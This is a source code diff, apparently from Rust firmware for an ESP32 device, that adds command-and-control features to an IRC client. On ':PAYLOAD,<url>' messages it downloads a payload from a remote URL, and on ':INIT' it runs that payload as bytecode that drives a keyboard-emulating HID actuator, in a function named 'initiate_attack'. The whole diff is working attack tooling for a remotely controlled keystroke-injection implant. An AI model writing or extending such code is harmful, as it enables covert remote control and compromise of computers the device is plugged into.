@@ -1,4 +1,10 @@
+use anyhow::bail;
 use esp_idf_hal::delay::FreeRtos;
+use log::{info, warn};
+use san_vm::runner;
+use sanscript_common::hid_actuator::HidActuator;
+use crate::actuator::esp_actuator::EspActuator;
+use crate::irc_client::http_client::PayloadHttpClient;
 use crate::irc_client::tcp_client::TcpClient;
 
 pub struct IRClient {
@@ -6,16 +12,21 @@ pub struct IRClient {
     channel_name: String,
     username: String,
     tcp_client: TcpClient,
+    http_client: PayloadHttpClient,
+    received_payload: Option<Vec<u8>>
 }
 
 impl IRClient {
-    pub fn new(server_address: String, server_port: usize, server_name: String, channel_name: String, username: String) -> IRClient {
-        IRClient {
+    pub fn new(server_address: String, server_port: usize, server_name: String, channel_name: String, username: String) -> anyhow::Result<IRClient> {
+        let http_client = PayloadHttpClient::new()?;
+        Ok(IRClient {
             server_name,
             channel_name,
             username,
             tcp_client: TcpClient::new(server_address, server_port),
-        }
+            http_client,
+            received_payload: None
+        })
     }
 
     pub fn send_nick(&mut self) -> anyhow::Result<()> {
@@ -70,6 +81,24 @@ impl IRClient {
         Ok(())
     }
 
+    pub fn download_payload(&mut self, url: &str) {
+        let payload_res = self.http_client.get_payload(url);
+        if let Ok(payload) =  payload_res {
+            self.received_payload = Some(payload);
+        } else if let Err(e) = payload_res {
+            warn!("Error while downloading: {}", e);
+        }
+    }
+
+    pub fn initiate_attack(&mut self) {
+        if let Some(payload) = self.received_payload.as_mut() {
+            let mut actuator = EspActuator::new();
+            actuator.init_actuator();
+            actuator.sleep(3000);
+            runner::deserialize_bytecode(actuator, payload);
+        }
+    }
+
     pub fn send_quit(&mut self) -> anyhow::Result<()> {
         self.tcp_client.send_command(String::from("QUIT\r\n"))
     }
@@ -87,10 +116,18 @@ impl IRClient {
                 comm if comm.contains(":IRC_DISCONN") || comm.contains(":TERMINATE") => {
                     self.send_message("Disconnecting from server!")?;
                     return Ok(());
-                },
+                }
                 comm if comm.contains(":WIFI,") => self.send_message("Received new wifi credentials, connecting...")?,
-                comm if comm.contains(":PAYLOAD,") => self.send_message("Received new payload, downloading...")?,
-                comm if comm.contains(":INIT") => self.send_message("Initiating attack!")?,
+                comm if comm.contains(":PAYLOAD,") => {
+                    let url = response.split(',').last();
+                    if let Some(payload_url) = url {
+                        let mut payload_url = payload_url[0..payload_url.find('\r').unwrap()].to_owned();
+                        self.download_payload(payload_url.as_str());
+                    } else {
+                        self.send_message("URL not provided!")?;
+                    }
+                },
+                comm if comm.contains(":INIT") => self.initiate_attack(),
                 _ => self.send_message("Unknown command received! Type HELP for list of commands")?
             }
         }
